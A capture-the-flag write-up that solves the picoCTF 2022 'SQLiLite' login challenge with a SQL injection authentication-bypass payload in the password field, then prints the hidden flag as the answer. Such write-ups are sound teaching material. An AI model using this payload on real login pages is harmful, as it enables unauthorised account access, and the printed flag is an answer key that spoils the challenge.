picoCTF: SQLiLite
=================

The following challenge was part of the picoCTF 2022 contest, a SQL injection,
worth 300 points:

.. more::

https://play.picoctf.org/practice/challenge/304?page=1&search=SQLiLite

The task is to log in to the website after you have launched a new instance.

**Hint:** Admin is the user you want to login as.


**Solution:**

There are many, many resources on the internet about SQL injection. I found the
following was exactly what I needed to solve this challenge:

https://www.geeksforgeeks.org/authentication-bypass-using-sql-injection-on-login-page/

You are asked to log in as 'admin'. If you just enter 'admin' as the username
and a single quote ``'`` as the password, you get the following output:

.. code::

    username: admin
    password: '
    SQL query: SELECT * FROM users WHERE name='admin' AND password='''


This seems like an error message, but it already gives away the SQL request
that is carried out on the webserver, namely the last line. You can now modify
the value that you enter as the password to give a non-empty SELECT statement.
That can easily be achieved by using the following login credentials:

``username: admin``

``password: ' OR '1'=='1'--``

This leads to the following result:


.. image:: picoctf_sqli_lite_1.png
   :scale: 100%


The last hint is not so difficult to understand. Just look at the websites
source code, and you find the following:

.. code:: html

    <pre>username: admin
    password: &#039; OR &#039;1&#039;==&#039;1&#039;--
    SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR &#039;1&#039;==&#039;1&#039;--&#039;
    </pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}</p>


We have found the flag! The solution is: ``picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}``


.. author:: default
.. categories:: none
.. tags:: none
.. comments::
